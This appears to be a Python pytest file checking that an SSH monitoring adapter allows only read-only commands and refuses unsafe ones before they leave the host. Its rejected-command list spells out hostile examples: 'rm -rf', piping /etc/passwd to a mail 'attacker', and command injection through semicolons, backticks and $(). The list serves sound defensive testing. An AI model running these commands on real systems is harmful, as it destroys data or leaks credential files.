"""5.3 — remote observation must be provably read-only."""

from __future__ import annotations

import pytest

from observe.ssh_adapter import (RemoteProbe, SshObserveAdapter, UnsafeCommand,
                                 assert_read_only)


@pytest.mark.parametrize("command", [
    "systemctl list-units --no-pager",
    "docker ps --format '{{.Names}}'",
    "ls -la /root",
    "wc -l /var/log/syslog",
    "journalctl -n 5 --no-pager",
])
def test_read_only_commands_are_allowed(command):
    assert assert_read_only(command)


@pytest.mark.parametrize("command", [
    "systemctl restart haveno-agent",       # mutating subcommand
    "systemctl stop docker",
    "docker rm hermes-agent",
    "docker exec hermes-agent sh",
    "rm -rf /root",                          # binary not allowlisted
    "curl https://example.com",
    "ls /root; rm -rf /tmp",                 # metacharacter
    "cat /etc/passwd | mail attacker",       # pipe
    "echo x > /root/file",                   # redirect
    "ls `whoami`",                           # backtick
    "ls $(whoami)",                          # substitution
    "",                                      # empty
])
def test_mutating_or_unsafe_commands_are_refused(command):
    with pytest.raises(UnsafeCommand):
        assert_read_only(command)


def test_unsafe_probe_is_refused_before_leaving_this_host():
    """The refusal must happen locally: an unsafe command never reaches ssh."""
    dispatched = []

    def spy(argv):
        dispatched.append(argv)
        return 0, "", ""

    adapter = SshObserveAdapter("somewhere",
                                [RemoteProbe("bad", "systemctl restart x")],
                                runner=spy)
    report = adapter.poll()
    assert dispatched == []                 # nothing was sent
    assert report.available is False
    assert "refused" in (report.error or "")


def test_successful_probes_become_observations():
    def fake(argv):
        return 0, "unit-a\nunit-b\nunit-c\n", ""

    adapter = SshObserveAdapter(
        "host", [RemoteProbe("services", "systemctl list-units --no-pager"),
                 RemoteProbe("containers", "docker ps")], runner=fake)
    report = adapter.poll(now=1000.0)
    assert report.available is True
    assert {o.key for o in report.observations} == {"services", "containers"}
    first = report.observations[0]
    assert first.data["lines"] == 3 and first.ts == 1000.0
    assert first.source == "ssh:host"


def test_unreachable_host_is_unavailable_not_idle():
    def boom(argv):
        raise OSError("ssh: connect to host port 22: Connection refused")

    report = SshObserveAdapter("dead", [RemoteProbe("x", "uptime")],
                               runner=boom).poll()
    assert report.available is False
    assert "NOT idle" in report.note
    assert "Connection refused" in (report.error or "")


def test_partial_failure_still_reports_what_answered():
    calls = {"n": 0}

    def flaky(argv):
        calls["n"] += 1
        if calls["n"] == 1:
            return 0, "ok\n", ""
        return 255, "", "timeout"

    adapter = SshObserveAdapter("host",
                                [RemoteProbe("good", "uptime"),
                                 RemoteProbe("bad", "df -h")], runner=flaky)
    report = adapter.poll()
    assert report.available is True
    assert [o.key for o in report.observations] == ["good"]
    assert "probe error" in report.note
